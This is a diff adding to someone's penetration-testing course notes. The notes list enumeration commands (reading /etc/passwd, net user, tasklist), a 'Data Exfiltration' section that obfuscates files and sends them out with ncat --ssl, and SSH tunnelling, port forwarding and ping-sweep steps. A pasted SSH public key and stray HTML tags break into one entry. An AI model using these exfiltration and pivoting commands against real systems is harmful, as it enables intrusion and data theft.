@@ -173,6 +173,94 @@ https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b
 !mona modules
 !mona jmp -r esp -m "essfunc.dll"
 
+-----------------------------------------------------------------------
+
+linux machine check
+	/etc/passwd
+	/etc/hosts
+
+user enumeration
+	windows
+		net user
+	linux
+		cat /etc/passwd
+
+process enumeration
+	windows
+		tasklists /v
+	linux
+		ps -elfssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgP2uXYcb+W40AxfGwjsfFlA6jR1/zL711bXQAjvAuEv5L6tNVkdDyNNdD66Q8Jwsh8DzLPDqeOTmQr7FDMAO5sCD7z+R+kEpvoVzBsgKXL22l2ipxGtCxJzhI1HT16fYB1BZPqmZpJylBdym3KN0yZvgFMs7B0jb9SFkh/+Jp1OxzohX88Xc2j+Dk1URkY0xZOTvOgYafFjbFINaeuVMqb+YeEyj9jxxNFo69F4selrftFmaf5AupSiW+P8GjOReArWBxEgvcLqshl+gTuf817jxb2terzW8f/qVK09XsepMPPZ5elfUqSzK1N3a4sTu1+0EsGALGjB/iSXbeCmcD comrade@extranet.site.donovia
+</pre>
+</body>
+
+service enumeration
+	windows
+		tasklist /svc
+	linux
+		chkconfig	# SysV
+		systemctl --type=service	# SystemD
+
+network connection enumeration
+	windows
+		ipconfig /all
+	linux
+		ifconfig -a
+		ip a
+
+Data Exfiltration
+	Session Transcript
+		ssh <user>@<host> | tee
+	Obfuscation (Windows)
+		type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
+		certutil -encode <file> encoded.b64
+	Obfuscation (Linux)
+		cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
+		cat <file>> | base64
+	Encrypted Transport
+		scp <source> <destination>
+		ncat --ssl <ip> <port> < <file>
+
+tunnel
+	ssh -MS /tmp/jump student@10.50.xx.xx
+dynamic forwarding
+	ssh -S /tmp/jump jump -O forward -D9050
+ping sweep
+	for i in {x..x} ;do (ping -c 1 x.x.x.$i | grep "bytes from" &) ;done
+	found 1.2.3.4
+	nmap/nc found 22 open
+port forward
+	ssh -S /tmp/jump jump -O forward -L1212:1.2.3.4:22
+scp <source> <destination>
+scp local "file.sh" to remote host
+	scp -P 1212 file.sh student@127.0.0.1:/home/student2/Documents
+scp file "script.sh" FROM remote host
+	scp -P 1212 student@127.0.0.1:/home/student2/Documents/script.sh .
+exact same thing but windows
+	to remote
+		scp -P 1212 file.sh student@127.0.0.1:C:/users/student/desktop 
+	from remote
+		scp -P 1212 student@127.0.0.1:C:/users/student/desktop/script.sh .
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
